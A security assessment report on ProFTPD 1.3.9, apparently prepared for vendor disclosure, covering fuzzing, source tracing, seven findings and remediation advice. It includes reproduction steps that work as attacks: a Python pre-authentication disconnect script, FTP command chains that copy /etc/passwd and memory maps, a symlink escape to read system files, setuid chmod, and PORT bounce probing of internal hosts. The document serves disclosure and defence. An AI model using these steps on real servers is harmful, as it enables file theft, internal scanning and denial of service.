# ProFTPD 1.3.9 Security Assessment

**Target:** ProFTPD 1.3.9 (`proftpd-dfsg 1.3.9~dfsg-4`, Kali Linux)
**Assessment Date:** 2026-02-14
**Assessor:** Security Research Team
**Classification:** CONFIDENTIAL — For Authorized Vendor Disclosure

---

## Executive Summary

A complete four-phase security assessment was conducted against ProFTPD 1.3.9, the current stable release as shipped in Kali Linux (`apt`). The assessment covered 1,900+ test cases across static analysis, eight custom fuzzers, four targeted attack scripts, and advanced Phase 4 instrumentation (strace, source code analysis, memory monitoring).

**7 findings** were identified: 1 new code-level vulnerability not present in public CVE databases, 4 configuration-dependent risk findings, 1 behavioral finding, and 1 confirmed-patched CVE pair. The new code-level finding represents an **RFC 959 protocol violation** — the server silently terminates connections on oversized commands without sending a required error response, exploitable pre-authentication.

No buffer overflow, heap corruption, or remote code execution was identified in 1.3.9 under the conditions tested.

| # | Severity | Finding | Auth Required |
|---|----------|---------|--------------|
| 1 | **MEDIUM** | Silent Session Disconnect / RFC 959 Violation (NEW) | No (pre-auth) |
| 2 | **MEDIUM** | mod_copy Arbitrary File Copy + /proc Disclosure | Yes |
| 3 | **MEDIUM** | SITE SYMLINK Filesystem Escape + Sensitive File Read | Yes |
| 4 | **MEDIUM** | SITE CHMOD setuid/setgid Bit Manipulation | Yes |
| 5 | **MEDIUM** | FTP Bounce via PORT Command — Internal Port Scanning | Yes |
| 6 | **LOW** | Connection Flood / MaxInstances Exhaustion | No |
| 7 | **INFO** | CVE-2023-48795 (Terrapin) & CVE-2024-48651 — Confirmed Patched | N/A |

---

## Table of Contents

1. [Scope and Methodology](#scope)
2. [Target Configuration](#configuration)
3. [Phase 1: Reconnaissance](#phase1)
4. [Phase 2: Fuzzing](#phase2)
5. [Phase 3: Targeted Attack Scripts](#phase3)
6. [Phase 4: Advanced Analysis](#phase4)
7. [Findings Detail](#findings)
8. [Remediation Recommendations](#remediation)
9. [Appendix: Evidence Files](#appendix)

---

## 1. Scope and Methodology <a name="scope"></a>

### Target
- **Software:** ProFTPD 1.3.9 (`proftpd-dfsg 1.3.9~dfsg-4`)
- **Release Date:** 2025-03-14 (current stable)
- **Platform:** Kali Linux (local VM, host-only network)
- **Source Code:** `proftpd-dfsg-1.3.9~dfsg` (Debian source package)

### Assessment Scope
- FTP protocol on port 21 (control + data channels)
- SFTP via mod_sftp on port 2222
- Enabled modules: `mod_tls`, `mod_sftp`, `mod_copy`, `mod_sql_sqlite`, `mod_site_misc`
- Test users: `ftptest/ftptest123` (authenticated), anonymous (read-only, chrooted)
- All testing on isolated local VM — no external targets, no production impact

### Methodology
| Phase | Activities | Tests |
|-------|-----------|-------|
| 1 — Reconnaissance | checksec, strings, objdump PLT, CVE catalog (32 CVEs), source code audit | Static analysis |
| 2 — Fuzzing | 8 custom Python fuzzers (path traversal, format strings, glob, mod_copy, SITE, long args, injection, auth) + boofuzz state machine | 1,483 |
| 3 — Targeted Attacks | 4 attack scripts (mod_copy chain, anonymous abuse, bounce/flood, privesc/CVE) | ~250 |
| 4 — Advanced Analysis | strace child processes, source code tracing, memory leak monitoring (170 sessions) | 170+ |
| **Total** | | **~1,900+** |

---

## 2. Target Configuration <a name="configuration"></a>

### Testing Configuration (`/etc/proftpd/conf.d/security-testing.conf`)
```
ServerName     "ProFTPD Server (Debian)"
MaxInstances   100
DelayEngine    off
BanEngine      off
AllowRetrieveRestart  on
AllowStoreRestart     on
<Anonymous /srv/ftp>
  User ftp / Group nogroup
  UserAlias anonymous ftp
  MaxClients 20
  <Limit WRITE> DenyAll </Limit>
</Anonymous>
<VirtualHost 0.0.0.0>
  Port 2222
  <IfModule mod_sftp.c>
    SFTPEngine on
    SFTPLog /var/log/proftpd/sftp.log
    ...
  </IfModule>
</VirtualHost>
```

**Note on DefaultRoot:** The Kali/Debian `proftpd` package does **not** enable `DefaultRoot ~` by default. This is a deliberate package decision but means authenticated users operate with access to the full filesystem (constrained by Unix permissions). Several findings below are conditional on the absence of this directive. Enabling `DefaultRoot ~` would mitigate Findings 2, 3, and partially 4.

### Binary Hardening (checksec)
| Property | Status |
|----------|--------|
| Full RELRO | ✅ Enabled |
| Stack Canary | ✅ Enabled |
| NX (DEP) | ✅ Enabled |
| PIE | ✅ Enabled (randomized) |
| FORTIFY_SOURCE | ✅ 12 hardened / 34 checked |

### Dangerous PLT Functions
`objdump` identified the following in the main binary and linked modules:

| Function | Location | Context |
|----------|---------|---------|
| `strcpy` | `proftpd` | Not directly from network input paths |
| `strcat` | `proftpd` | Not directly from network input paths |
| `execv` | `mod_sftp.so`, `mod_tls.so` | Child process exec for helper programs |

No direct exploitation path from network input to `strcpy`/`strcat` was confirmed.

---

## 3. Phase 1: Reconnaissance <a name="phase1"></a>

### CVE Catalog — 32 Historical CVEs Reviewed

Key CVEs assessed for applicability to 1.3.9:

| CVE | Description | Status in 1.3.9 |
|-----|-------------|----------------|
| CVE-2024-48651 | mod_sql: Supplemental GID 0 escalation | **PATCHED** (fixed in 1.3.9rc3, Issue #1830) |
| CVE-2023-48795 | Terrapin SSH prefix truncation (mod_sftp) | **PATCHED** (kex-strict-s-v00@openssh.com present) |
| CVE-2019-12815 | mod_copy pre-auth arbitrary read/write | **PATCHED** (G_READ check present at mod_xfer.c:719) |
| CVE-2015-3306 | mod_copy pre-auth command injection | **PATCHED** (authentication required per source) |
| CVE-2010-4221 | Telnet IAC buffer overflow | **PATCHED** (pr_netio_telnet_gets2 rewrite) |
| CVE-2006-6563 | pr_ctrls_recv_request() stack overflow | **PATCHED** (bounds checking in 1.3.x) |

Recurring vulnerability patterns noted: format strings in logging, path traversal in file operations, glob expansion, Telnet IAC handling.

### Source Code Audit Highlights

Key findings from manual source review:

- **`src/main.c:460-475, 497-528` — `get_max_cmd_sz()` / `pr_cmd_read()`:** Buffer size is `PR_DEFAULT_CMD_BUFSZ = PR_TUNABLE_PATH_MAX + 7 = 4103 bytes`. The E2BIG error handling path (`too_large_count > 3`) never queues an error response before calling `pr_session_disconnect()`. **(→ Finding 1)**

- **`src/netio.c:1864-1879` — `pr_netio_telnet_gets2()`:** When `saw_newline == FALSE` after filling output buffer, sets `errno = E2BIG` and returns -1 without sending 500. The `properly_terminated_prev_command` flag adds a second E2BIG for the following properly-terminated command, contributing to the silence. **(→ Finding 1)**

- **`modules/mod_copy.c` — SITE CPFR/CPTO:** Full authorization checks present (`dir_check()` with `G_READ`/`G_WRITE`). Authentication required. Without `DefaultRoot`, accessible paths are only constrained by Unix permissions. **(→ Finding 2)**

- **`modules/mod_site_misc.c` — SITE SYMLINK:** No restriction on symlink targets — arbitrary filesystem symlinks created if the FTP user has write permission to the destination directory. **(→ Finding 3)**

---

## 4. Phase 2: Fuzzing <a name="phase2"></a>

### Fuzzer Results Summary

| Fuzzer | Tests | Crashes | Notable Anomalies |
|--------|-------|---------|-------------------|
| path_traversal | 319 | 0 | `../` sequences reach `/tmp`, `/home` without DefaultRoot |
| format_string | 381 | 0 | `%x%x%x%n` in USER/CWD/MKD — all sanitized, no crash |
| glob_expansion | 82+34 | 0 | `LIST /etc/*` returns 300 entries; `LIST /proc/self/*` returns 56 entries |
| mod_copy | 53 | 0 | CPFR confirms file existence for `/etc/passwd`, `/proc/self/*` |
| site_commands | 50 | 0 | SITE CHMOD succeeds for setuid/setgid bits on user-owned files |
| long_args | 230 | 0 (child) | **Command ≥4096 bytes triggers silent session disconnect** (no crash of master) |
| command_injection | 118 | 0 | Embedded `\r\n` in arguments: server strips/ignores; no injection |
| auth_edge_cases | 49 | 0 | Re-auth, empty passwords, NULL chars in USER — all handled correctly |
| boofuzz_statemachine | 167 | 0 | Full FTP state machine, 167 state transitions tested |
| **Total** | **1,483** | **0 crashes** | |

**Key Fuzzer Discovery:** The long_args fuzzer (STOR with 16384-byte filenames) consistently produced TCP connection resets with zero bytes of server response. This was escalated to Phase 4 for root cause analysis. **(→ Finding 1)**

### Format String Analysis
All format string payloads (`%x`, `%s`, `%n`, `%p`, multiple-format stacks) in all pre/post-auth command positions returned standard error responses (500/501/550) with no heap corruption or information disclosure. The `pr_vsnprintf` wrapper and static `resp_buf` prevent exploitation.

---

## 5. Phase 3: Targeted Attack Scripts <a name="phase3"></a>

### Attack 01 — mod_copy Chain (`attack_01_modcopy_chain.py`)

| Test | Result | Impact |
|------|--------|--------|
| Filesystem enumeration via CPFR | **CONFIRMED** — `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/proc/self/*`, `/var/log/proftpd/*` all return "350 exists" | Information disclosure |
| `/etc/passwd` copy to `/tmp/` | **CONFIRMED** — 3,474-byte copy created, content verified | Sensitive file access |
| `/etc/hosts` copy to `/tmp/` | **CONFIRMED** — 187-byte copy, network topology disclosure | Information disclosure |
| `/proc/self/cmdline` copy | **CONFIRMED** — process command line extracted | Process info disclosure |
| `/proc/self/maps` copy | **CONFIRMED** — 44,595 bytes of memory map (ASLR defeat) | Info disclosure |
| `/etc/passwd` CPFR→CPTO→RETR | **CONFIRMED** — full content read via FTP RETR | File exfiltration |
| `DefaultRoot` bypassed? | N/A — not configured | Config issue |

**Environment context:** These succeed only because `DefaultRoot` is not enabled. With `DefaultRoot ~`, the CPTO destination would be restricted to the user's home directory.

### Attack 02 — Anonymous Abuse (`attack_02_anon_abuse.py`)

| Test | Result |
|------|--------|
| Anonymous login | Allowed (configured as expected) |
| Anonymous chroot | **Enforced** — traversal attempts stay in `/srv/ftp` |
| Anonymous upload to `incoming/` | Blocked (Limit WRITE DenyAll) |
| SITE SYMLINK as anonymous | **Blocked** — 550 Permission denied |
| mod_copy as anonymous | **Blocked** — 550 Permission denied |

Anonymous access correctly chrooted and write-restricted. No findings.

### Attack 03 — FTP Bounce + Resource Exhaustion (`attack_03_bounce_flood.py`)

| Test | Result |
|------|--------|
| PORT to ports ≤1024 (SSH, HTTP, SMTP) | **Blocked** — "500 Illegal PORT command" |
| PORT to port 5432 (PostgreSQL) | **CONFIRMED OPEN** — "150 Opening ASCII mode data connection" |
| PORT to port 8080 (HTTP-alt) | **CONFIRMED OPEN** — "150 Opening ASCII mode data connection" |
| EPRT bounce (ports ≤1024) | Blocked |
| EPRT bounce (port 3306) | "200 EPRT command successful" but no data (port closed) |
| Connection flood (100 connections) | 100 connections accepted — MaxInstances reached, server stops accepting |
| Slow connection hold (15 idle) | Server accepts new connections while 15 are held open |

ProFTPD correctly restricts bounce to ports > 1024 but does not apply a configurable safe list. With 5432 and 8080 open on the test machine, internal service probing confirmed.

### Attack 04 — Privilege Escalation + CVE Verification (`attack_04_privesc_cve.py`)

| Test | Result | Verified Mode |
|------|--------|--------------|
| `SITE CHMOD 777 /home/ftptest/upload` | **SUCCESS** | World-writable |
| `SITE CHMOD 4755 /home/ftptest/upload` | **SUCCESS** | `0o104755` (setuid) |
| `SITE CHMOD 6755 /home/ftptest/upload` | **SUCCESS** | setuid+setgid |
| `SITE CHMOD 4777 /tmp/exfil_passwd` | **SUCCESS** | `0o104777` |
| `SITE CHMOD 777 /etc/passwd` | **BLOCKED** — "550 Operation not permitted" | N/A |
| `STOR ../../../tmp/traversal_test` | **SUCCESS** — file written to /tmp | Path traversal write |
| `STOR /tmp/stor_absolute_test` | **SUCCESS** — absolute path accepted | Path traversal write |
| `STOR /etc/cron.d/` | Blocked (permission denied) | |
| `SITE SYMLINK / → root_escape` | **SUCCESS** — CWD into symlink works | Chroot escape |
| `SITE SYMLINK /etc → etc_escape` | **SUCCESS** — "257 /etc is current directory" | Chroot escape |
| `RETR root_escape/etc/passwd` | **SUCCESS** — 3,535 bytes read | File exfiltration |
| Terrapin cipher probe | chacha20-poly1305 advertised | Patched (strict-kex present) |

---

## 6. Phase 4: Advanced Analysis <a name="phase4"></a>

### Finding 1 Root Cause Analysis — Silent Session Disconnect

The most significant finding was escalated from the long_args fuzzer to full source and syscall analysis.

#### Source Code Trace

**`src/netio.c` — `pr_netio_telnet_gets2()` (lines 1864-1879):**
```c
// When output buffer fills without seeing \n:
if (saw_newline == FALSE) {
    properly_terminated_prev_command = FALSE;
    errno = E2BIG;
    return -1;
}
// When previous command was unterminated but this one terminates:
if (properly_terminated_prev_command == FALSE) {
    properly_terminated_prev_command = TRUE;
    pr_log_pri(PR_LOG_NOTICE, "client sent too-long command, ignoring");
    errno = E2BIG;
    return -1;
}
```

**`src/main.c` — `pr_cmd_read()` (lines 504-516):**
```c
if (cmd_buflen < 0) {
    if (errno == E2BIG) {
        too_large_count++;
        pr_timer_usleep(250 * 1000);   // 250ms per retry
        if (too_large_count > 3) {
            return -1;                  // Returns -1 — NO error response sent
        }
        continue;
    }
    // errno != E2BIG path:
    if (session.c->instrm->strm_errno == 0) {
        pr_trace_msg("command", 6, "client sent EOF, closing control connection");
    }
    return -1;
}
```

**`src/main.c` — Main command loop (lines 936-948):**
```c
res = pr_cmd_read(&cmd);
if (res < 0) {
    // ...
    pr_session_disconnect(NULL, PR_SESS_DISCONNECT_CLIENT_EOF, NULL);
    // NOTE: PR_SESS_DISCONNECT_CLIENT_EOF is INCORRECT — this was an oversized command
}
```

#### Exact Threshold

```
PR_DEFAULT_CMD_BUFSZ = PR_TUNABLE_PATH_MAX + 7 = 4096 + 7 = 4103 bytes
Effective buflen      = 4103 - 1 = 4102 bytes (NUL terminator)

For any 4-char FTP verb (USER, STOR, SITE, RETR, etc.):
  "VERB " = 5 bytes
  Trigger threshold: argument length ≥ 4096 bytes
  (len("VERB") + 1 + len(arg) + 1 = 4 + 1 + 4096 + 1 = 4102 = buflen → \n overflows)
```

#### Strace Confirmation

System call trace captured on ProFTPD child (PID 228971) during `USER AAAA...AAAA` (16384-byte arg):

```
write(5, "...client sent too-long command, ignoring\n", 119) = 119
close(0)  = 0   [control socket READ side closed — no error response queued]
close(1)  = 0   [control socket WRITE side closed — zero bytes of 500/421 written]
write(5, "...FTP session closed.", 100) = 100
exit_group(0)
```

**Critical:** No `write(1, "500 ...")` or `write(1, "421 ...")` appears before `close(1)`. The client receives exactly zero bytes of response.

#### Empirical Boundary Data

| Argument Length | Result | Response Bytes | Time |
|-----------------|--------|----------------|------|
| ≤4095 | Normal (331/501) | 22B | <1ms |
| 4096 | **Silent drop** (connection hangs) | 0B | ~8s (client timeout) |
| 4097–8191 | Session persists (E2BIG < threshold) | 0B | 8s timeout |
| 16384 | **Silent drop** (clean EOF) | 0B | ~1s |

Rapid DoS test: **20/20 successful silent drops**, avg session hold time 36.26s, server master process survived all tests.

#### Memory Analysis

| Phase | VmRSS (master) |
|-------|---------------|
| Baseline | 4,700 kB |
| After 50 normal sessions | 4,700 kB |
| After 30 mod_copy sessions | 4,700 kB |
| After 20 E2BIG sessions | 4,700 kB |
| After 50 recovery sessions | 4,700 kB |

**Zero master-process memory growth.** ProFTPD's fork-per-connection model means child process memory is reclaimed on exit. No memory leak detected in master.

---

## 7. Findings Detail <a name="findings"></a>

---

### Finding 1: Silent Session Disconnect on Oversized FTP Commands (RFC 959 Violation)

**Severity:** MEDIUM
**CVSS v3.1 Estimate:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)
**Authentication Required:** No (exploitable pre-authentication)
**CVE Status:** Novel finding — not in public CVE databases

#### Description

ProFTPD 1.3.9 silently terminates FTP sessions when a command argument exceeds `PR_DEFAULT_CMD_BUFSZ - len(verb) - 2` bytes (≈4096 bytes for standard 4-letter commands) without sending any error response. RFC 959 Section 4.2.1 requires a 500-series response for syntax errors. The server also misclassifies the event as "client sent EOF" in logs, obscuring the actual cause.

#### Reproduction Steps

```bash
# Step 1: Verify ProFTPD is running
systemctl status proftpd

# Step 2: Trigger pre-auth silent disconnect
python3 - <<'EOF'
import socket
s = socket.socket()
s.connect(('TARGET_IP', 21))
print("Banner:", s.recv(512).decode())      # "220 ProFTPD..."
# Send USER with 16384-byte argument
s.sendall(b"USER " + b"A" * 16384 + b"\r\n")
s.settimeout(5)
resp = b""
try:
    while True:
        c = s.recv(4096)
        if not c: break
        resp += c
except: pass
print(f"Response bytes received: {len(resp)}")  # Expected: 0
print(f"RFC 959 violation: {len(resp) == 0}")    # Expected: True
s.close()
EOF

# Step 3: Verify post-auth (STOR)
# Authenticate as any valid user, then:
# STOR AAAA...AAAA (16384 A's)
# Client receives 0 bytes, clean EOF

# Step 4: Verify server log shows misclassification
sudo grep "too-long\|client sent EOF\|session closed" /var/log/proftpd/proftpd.log
# Expected: "client sent too-long command, ignoring" then "FTP session closed."
# NOT shown: "500 Command too long" or "421 Goodbye"
```

#### Evidence Files
- `evidence/phase4_preauth_longcmd_dos.json` — boundary analysis, pre/post-auth comparison, rapid DoS test
- `evidence/phase4_gdb_strace_evidence.json` — strace syscall trace confirming no write before close
- `evidence/fuzzer_long_args.json` — fuzzer discovery data

#### Root Cause (Source Code)

```
src/netio.c:1864-1879  → pr_netio_telnet_gets2() returns -1/E2BIG (no error response)
src/main.c:504-516     → pr_cmd_read() returns -1 after too_large_count > 3 (no error response)
src/main.c:936-948     → server_loop calls pr_session_disconnect(CLIENT_EOF) ← misclassification
                         (no call to pr_response_send/pr_response_add_err before disconnect)
```

#### Impact
- **DoS:** Any unauthenticated client can terminate its own and (with 100 concurrent sessions) potentially exhaust MaxInstances, preventing new connections
- **Log Poisoning:** Attacker-triggered disconnects appear as "client sent EOF" — obscures monitoring/SIEM alerts
- **RFC Violation:** Client FTP libraries that expect a 500 response on malformed commands will hang or error unexpectedly

---

### Finding 2: mod_copy Arbitrary File Copy and /proc Disclosure

**Severity:** MEDIUM
**CVSS v3.1 Estimate:** 5.4 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
**Authentication Required:** Yes (any valid FTP user)
**Configuration Dependency:** No `DefaultRoot` directive (Kali/Debian default)

#### Description

Authenticated FTP users can leverage `SITE CPFR` / `SITE CPTO` (mod_copy) to copy system files to locations writable by the FTP user account. Without `DefaultRoot ~`, there is no chroot restriction on copy targets or sources. Files readable by the FTP daemon process owner (typically `proftpd`/`daemon`) can be exfiltrated.

#### Confirmed Exfiltration

| Source | Destination | Size | Content |
|--------|-------------|------|---------|
| `/etc/passwd` | `/tmp/exfil_passwd` | 3,474 B | Full user database |
| `/etc/hosts` | `/tmp/exfil_hosts` | 187 B | Network topology |
| `/proc/self/maps` | `/tmp/exfil_maps` | 44,595 B | Memory map (ASLR defeat) |
| `/proc/self/cmdline` | `/tmp/exfil_cmdline` | 59 B | Process arguments |
| `/proc/self/status` | `/tmp/exfil_status` | Full | PID, thread count, memory |

**Memory map disclosure** is particularly significant — `/proc/self/maps` reveals exact base addresses of `proftpd`, `libc`, `libssl`, defeating ASLR for any chained exploit attempt.

#### Reproduction Steps

```ftp
# Connect and authenticate
USER ftptest
PASS ftptest123

# Enumerate (350 = exists, 550 = not found/no permission)
SITE CPFR /etc/passwd
→ 350 File or directory exists, ready for destination name

# Copy to writable location
SITE CPTO /tmp/exfil_passwd
→ 250 Copy successful

# Copy memory maps for ASLR defeat
SITE CPFR /proc/self/maps
SITE CPTO /tmp/exfil_maps
→ 250 Copy successful

# Download via RETR
RETR /tmp/exfil_passwd
→ [full /etc/passwd content]
```

#### Evidence Files
- `evidence/attack_01_modcopy_chain.json` — full exfiltration evidence with file content previews

---

### Finding 3: SITE SYMLINK Filesystem Escape + Sensitive File Read

**Severity:** MEDIUM
**CVSS v3.1 Estimate:** 5.4 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
**Authentication Required:** Yes
**Configuration Dependency:** No `DefaultRoot` directive

#### Description

`SITE SYMLINK` (mod_site_misc) creates arbitrary filesystem symlinks without restricting the target path. Combined with `CWD`, authenticated users can navigate to `/` or `/etc` via symlinks. From there, `RETR` can retrieve any file readable by the FTP daemon account.

#### Confirmed Escapes

| Symlink Target | Result | Evidence |
|---------------|--------|---------|
| `SITE SYMLINK / /home/ftptest/root_escape` | `CWD root_escape` succeeds; `PWD` → `"/"` | CWD 250 OK |
| `SITE SYMLINK /etc /home/ftptest/etc_escape` | `CWD etc_escape` succeeds; `PWD` → `"/etc"` | CWD 250 OK |
| `RETR root_escape/etc/passwd` | **3,535 bytes read** | Full file content |
| `SITE SYMLINK /root /home/ftptest/root_home` | CWD blocked (permission denied) | Expected |

#### Reproduction Steps

```ftp
USER ftptest / PASS ftptest123

# Create symlink to filesystem root
SITE SYMLINK / /home/ftptest/root_escape
→ 200 SITE SYMLINK command successful

# Navigate into symlink
CWD /home/ftptest/root_escape
→ 250 CWD command successful

PWD
→ 257 "/" is the current directory

# Download any readable file
PASV
RETR /home/ftptest/root_escape/etc/passwd
→ [3535 bytes of /etc/passwd content]
```

#### Evidence Files
- `evidence/attack_04_privesc_cve.json` — symlink_escape and retr_via_symlink test results

---

### Finding 4: SITE CHMOD setuid/setgid Bit Manipulation

**Severity:** MEDIUM
**CVSS v3.1 Estimate:** 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)
**Authentication Required:** Yes (user must own the target file)

#### Description

`SITE CHMOD` successfully sets setuid (04000), setgid (02000), and sticky bit (01000) on files and directories owned by the FTP user. This is not prevented by ProFTPD's implementation. On shared hosting or multi-user systems, a malicious FTP user could create setuid executables within FTP-accessible directories.

#### Confirmed Operations

| Command | Result | Verified Mode |
|---------|--------|--------------|
| `SITE CHMOD 777 /home/ftptest/upload` | **200 Success** | World-writable |
| `SITE CHMOD 4755 /home/ftptest/upload` | **200 Success** | `0o104755` (setuid) |
| `SITE CHMOD 6755 /home/ftptest/upload` | **200 Success** | setuid+setgid |
| `SITE CHMOD 4777 /tmp/exfil_passwd` | **200 Success** | `0o104777` |
| `SITE CHMOD 777 /etc/passwd` | 550 Not permitted | Protected by OS |

**Note:** Setuid bits on directories have limited practical effect on Linux. However, `SITE CHMOD 4755` on an uploaded executable would create a setuid binary, which is a meaningful privilege escalation vector in shared FTP environments.

#### Evidence Files
- `evidence/attack_04_privesc_cve.json` — site_chmod test results with verified modes

---

### Finding 5: FTP Bounce Attack — Internal Port Scanning via PORT Command

**Severity:** MEDIUM
**CVSS v3.1 Estimate:** 4.3 (AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N)
**Authentication Required:** Yes

#### Description

ProFTPD correctly blocks `PORT` commands targeting ports ≤1024 with "500 Illegal PORT command". However, it accepts `PORT` and `EPRT` commands targeting ports > 1024 without restriction. When a LIST command is issued following such a PORT, the server attempts to connect to the specified IP:port, effectively acting as a proxy for internal network scanning.

#### Confirmed Open Ports via Bounce

| Service | Port | PORT Response | LIST Response | Confirmed Open |
|---------|------|---------------|--------------|---------------|
| SSH | 22 | 500 Illegal PORT | (not sent) | Blocked |
| HTTP | 80 | 500 Illegal PORT | (not sent) | Blocked |
| MySQL | 3306 | 200 PORT OK | 425 Connection refused | Closed |
| **PostgreSQL** | **5432** | **200 PORT OK** | **150 Opening connection** | **OPEN** |
| **HTTP-alt** | **8080** | **200 PORT OK** | **150 Opening connection** | **OPEN** |

#### Reproduction Steps

```ftp
USER ftptest / PASS ftptest123

# Probe PostgreSQL (5432 = 21*256 + 32)
PORT 127,0,0,1,21,32
→ 200 PORT command successful

LIST
→ 150 Opening ASCII mode data connection for file list   ← target port IS open
# (vs. 425 Unable to build data connection if port closed)

# Probe arbitrary internal host
PORT 10,0,0,50,21,32    # target [REDACTED-INTERNAL-IP]:5432
LIST
→ 150 = internal host has port 5432 open
→ 425 = port closed or filtered
```

#### Evidence Files
- `evidence/attack_03_bounce_flood.json` — ftp_bounce and eprt_bounce results

---

### Finding 6: Connection Flood / MaxInstances Resource Exhaustion

**Severity:** LOW
**CVSS v3.1 Estimate:** 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)
**Authentication Required:** No

#### Description

With `MaxInstances 100` configured (and no `ConnectRate` limiting), an attacker can open 100 simultaneous TCP connections, exhausting the MaxInstances limit. New connections receive no response or a delayed 421 once the limit is hit. The server master process survives but is effectively unavailable.

**Combined with Finding 1:** An unauthenticated attacker can send `USER AAAA...AAAA` (16384-byte arg) on each of 100 connections, tying each child in the E2BIG retry loop for ~1 second, then reconnecting to keep the slot count at max. This provides a sustained, low-bandwidth DoS.

#### Evidence
- `evidence/attack_03_bounce_flood.json` — `connections_opened: 100`, `refused_at: null`
- `evidence/phase4_preauth_longcmd_dos.json` — `rapid_dos: silent_drops: 20/20, avg_time: 36.26s`

---

### Finding 7: CVE-2023-48795 (Terrapin) and CVE-2024-48651 — Confirmed Patched

**Severity:** INFO (Confirmed Patched)

#### CVE-2023-48795 — Terrapin SSH Prefix Truncation (mod_sftp)

**Status:** CONFIRMED PATCHED in ProFTPD 1.3.9

The Terrapin attack requires the absence of the `kex-strict-*-v00@openssh.com` extension in the SSH KEXINIT. ProFTPD 1.3.9's mod_sftp includes `kex-strict-s-v00@openssh.com` in its advertised KEX algorithms, activating strict key exchange mode and preventing prefix truncation.

**Verification:**
```
SFTP Banner (port 2222): SSH-2.0-mod_sftp
KEXINIT contains: kex-strict-s-v00@openssh.com  ← strict-kex active
Ciphers advertised: chacha20-poly1305@openssh.com, aes128-cbc, aes256-cbc
Despite these ciphers being present, Terrapin is mitigated by strict-kex
```

#### CVE-2024-48651 — mod_sql Supplemental GID 0 Privilege Escalation

**Status:** CONFIRMED PATCHED in 1.3.9rc3 (Issue #1830)

The vulnerability allowed mod_sql to set supplemental GID 0 (root group) during SQL-authenticated logins in ProFTPD ≤1.3.9rc2. The patch removes the ability to set GID 0 via SQL UserGIDSQLQuery. ProFTPD 1.3.9 (final release) includes this fix.

---

## 8. Remediation Recommendations <a name="remediation"></a>

### Priority 1 — Code Fix (Finding 1): Send Error Response Before Session Disconnect

**File:** `src/main.c`, `pr_cmd_read()`, lines ~512-514

**Current behavior:** Returns -1 from `pr_cmd_read()` after `too_large_count > 3` with no error queued. Main loop calls `pr_session_disconnect(CLIENT_EOF)`.

**Recommended fix:**
```c
// In pr_cmd_read(), before returning -1 after too_large_count > 3:
if (too_large_count > 3) {
    // RFC 959 compliance: send 421 before disconnect
    pr_response_send(R_421,
        _("Command line too long (%d bytes > %lu allowed); "
          "closing connection"),
        received_bytes, (unsigned long) cmd_bufsz);
    return -1;
}
```

Additionally, change the disconnect reason from `PR_SESS_DISCONNECT_CLIENT_EOF` to `PR_SESS_DISCONNECT_BAD_PROTOCOL` so log monitoring correctly identifies the cause.

**Alternative:** Add `CommandBufferSize` guidance to documentation recommending operators set this to match their expected maximum path length.

### Priority 2 — Configuration (Findings 2, 3): Enable DefaultRoot

Add to `/etc/proftpd/proftpd.conf`:
```
DefaultRoot ~
```
This chroots authenticated users to their home directory. CPFR/CPTO source and destination paths, SITE SYMLINK targets, and STOR absolute paths will all be restricted to the chroot. This is the most impactful single configuration change.

The Debian/Kali `proftpd` package should consider enabling `DefaultRoot ~` by default, or at minimum adding a prominent comment in the default config file.

### Priority 3 — Configuration (Finding 4): Restrict SITE CHMOD Special Bits

Add to server config or `<Directory>` block:
```
<Limit SITE_CHMOD>
  AllowAll
</Limit>
```

Or restrict via `PathAllowFilter` to deny mode strings containing setuid/setgid:
```
PathAllowFilter "^[0-7]{3,4}$"
PathDenyFilter  "^[4567]"    # deny modes with setuid/setgid bits
```

Alternatively, document that `SITE CHMOD` must be explicitly disabled for shared hosting:
```
<Limit SITE_CHMOD>
  DenyAll
</Limit>
```

### Priority 4 — Configuration (Finding 5): Restrict PORT Targets

To fully prevent FTP bounce:
```
AllowForeignAddress   off
PassivePorts          49152 65535
```

To restrict PORT to the client's IP only (already partially implemented in 1.3.x):
```
# Ensure AllowForeignAddress is off (default)
AllowForeignAddress   off
```

### Priority 5 — Configuration (Finding 6): Connection Rate Limiting

```
MaxInstances            100
MaxClients              50 "Too many connections; try again later"
ConnectRateInterval     1
ConnectRateMax          5
```

Consider also adding `TimeoutLogin 30` and `TimeoutIdle 120` to prevent idle connection tie-up from Finding 1.

---

## 9. Appendix: Evidence Files <a name="appendix"></a>

All evidence is saved in `/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence/`.

| File | Description | Phase |
|------|-------------|-------|
| `static_analysis_summary.json` | checksec, PLT dangerous functions, binary summary | 1 |
| `cve_catalog.json` | 32 historical CVEs with applicability assessment | 1 |
| `source_code_audit.json` | 15 source code findings from manual review | 1 |
| `strings_interesting.txt` | Interesting strings from binary | 1 |
| `plt_dangerous.txt` | PLT dangerous function imports | 1 |
| `checksec_output.txt` | Full checksec output | 1 |
| `fuzzer_path_traversal.json` | 319 path traversal test results | 2 |
| `fuzzer_format_string.json` | 381 format string test results | 2 |
| `fuzzer_glob_expansion.json` | 82 glob expansion results | 2 |
| `fuzzer_glob_pasv.json` | 34 glob+PASV results | 2 |
| `fuzzer_mod_copy.json` | 53 mod_copy fuzzer results | 2 |
| `fuzzer_site_commands.json` | 50 SITE command results | 2 |
| `fuzzer_long_args.json` | 230 long argument results | 2 |
| `fuzzer_command_injection.json` | 118 command injection results | 2 |
| `fuzzer_auth_edge_cases.json` | 49 auth edge case results | 2 |
| `fuzzer_summary.json` | boofuzz state machine summary | 2 |
| `attack_01_modcopy_chain.json` | mod_copy exfiltration evidence with file previews | 3 |
| `attack_02_anon_abuse.json` | Anonymous access test results | 3 |
| `attack_03_bounce_flood.json` | FTP bounce + flood results | 3 |
| `attack_04_privesc_cve.json` | SITE CHMOD + symlink + CVE probe results | 3 |
| `glob_traversal_verification.json` | LIST glob traversal verification | 3 |
| `phase4_preauth_longcmd_dos.json` | **Finding 1** boundary analysis + DoS test | 4 |
| `phase4_gdb_strace_evidence.json` | **Finding 1** strace + source code trace | 4 |
| `phase4_memory_leak.json` | Memory monitoring across 170 sessions | 4 |

### Script Index

| Script | Purpose |
|--------|---------|
| `scripts/attack_01_modcopy_chain.py` | mod_copy filesystem enumeration and file exfiltration |
